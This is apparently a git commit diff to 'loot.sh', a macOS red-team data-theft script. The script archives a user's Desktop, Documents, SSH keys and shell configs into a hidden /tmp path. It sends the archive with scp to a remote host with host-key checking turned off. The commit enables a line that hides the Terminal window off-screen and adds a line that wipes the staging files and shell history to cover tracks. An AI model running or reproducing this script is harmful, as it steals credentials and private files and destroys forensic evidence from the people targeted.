df63bb8a7089076e5e2bf37a32dc07ffac7e0885
un1x01d <>
2022-08-19 00:55:06 -0400

    test 2

--- MacOS_Red_Looter/loot.sh
+++ MacOS_Red_Looter/loot.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# osascript -e 'tell application "Terminal" to set boounds of front window to {3000, 2000, 10, 10}'
+osascript -e 'tell application "Terminal" to set boounds of front window to {3000, 2000, 10, 10}'
 
 HOME="/Users/$USER"
 
@@ -11,3 +11,5 @@ cd /tmp/.s/.t/.e/.a/.l
 tar cfz .loot.tgz $HOME/Desktop $HOME/Documents $HOME/.ssh $HOME/.bash* $HOME/.config $HOME/.zsh*
 
 scp -q -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz zed@192.168.1.216:~/demo/
+
+set -e && rm -rf /tmp/.s ~/.bash_history ~/.zsh_history && history -c
